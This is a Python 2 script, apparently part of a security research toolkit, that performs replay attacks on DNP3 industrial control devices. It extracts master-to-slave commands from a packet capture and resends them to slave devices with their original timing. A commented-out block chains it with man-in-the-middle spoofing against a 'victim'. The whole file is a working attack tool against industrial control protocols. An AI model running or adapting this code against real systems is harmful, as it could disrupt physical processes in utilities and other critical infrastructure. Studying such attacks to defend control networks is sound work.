__author__ = 'Nicholas Rodofile'
from DNP3_Master import *

"""
This script is used to perform replay attacks against slave devices.
"""

class DNP3_Replay(Master):
    def __init__(self, node, port, pcap):
        Master.__init__(self, node, port)
        self.pcap = rdpcap(pcap)
        self.replay_messages = list()
        self.transport_seq_real = 0
        self.application_seq_real = 0
        self.transport_seq = 0
        self.application_seq = 0

    # Configure DNP3 Addresses for replay
    def address_conf(self, request):
        self.host['master'] = request[DNP3].SOURCE
        self.host['slave'] = request[DNP3].DESTINATION
        self.address_configured = True

    def filter_pcap(self):
        for p in self.pcap:
            if p.haslayer(DNP3):
                if p[DNP3].CONTROL.DIR == MASTER:
                    self.replay_messages.append(p)


    def get_address(self):
        for d in self.replay_messages:
            if not self.address_configured:
                self.address_conf(d)
            else:
                pass

    def replay(self):
        print len(self.replay_messages), "Replayable Packets"
        m = self.replay_messages[0]
        wait_time = m.time
        self.queue_out.put(m[DNP3])
        for m in self.replay_messages[1:]:
            sleep_time = m.time - wait_time
            time.sleep(sleep_time)
            self.queue_out.put(m[DNP3])
            wait_time = m.time


    def get_nodes(self):
        pass

    def show_address(self):
        print "--------------- DNP3 from capture ---------------"
        print "#################################################"
        print " Master:", self.host['master'], " Slave:", self.host['slave']
        print "#################################################"

    def automation(self):
        print "Automation running...Master Replay"
        self.filter_pcap()
        if not self.node.spoofer.destination.DNP3_address \
                and not self.node.spoofer.source.DNP3_address:
            dnp3_address = read_config_dnp3(self.node.spoofer.source.ip_address)
            if dnp3_address is not None:
                self.node.spoofer.source.DNP3_address = int(dnp3_address['dnp3_src'])
                self.node.spoofer.destination.DNP3_address = int(dnp3_address['dnp3_dst'])
            else:
                self.get_address()
        self.replay()
        self.running = False
        print "Replay Done..."
        sleep(10)
        self.socket.close()

    def start(self):
        automation = Thread(target=self.automation)
        automation.daemon = True
        automation.start()
        super(Master, self).start()
        automation.join()
        self.socket.close()
        return self.host

# while True:
#     mitm = DNP3_MITM_conf()
#     mitm.init_spoofing()
#     victim = mitm.victim
#     master = DNP3_Replay(victim, dnp3_port, "mitm/replay_20160225_1634.pcap")
#     DNP = master.start()
#
#
#     #input_val = raw_input("Recon Next DNP3 device?")
#     #if input_val == 'n' or input_val == 'N':
#     quit()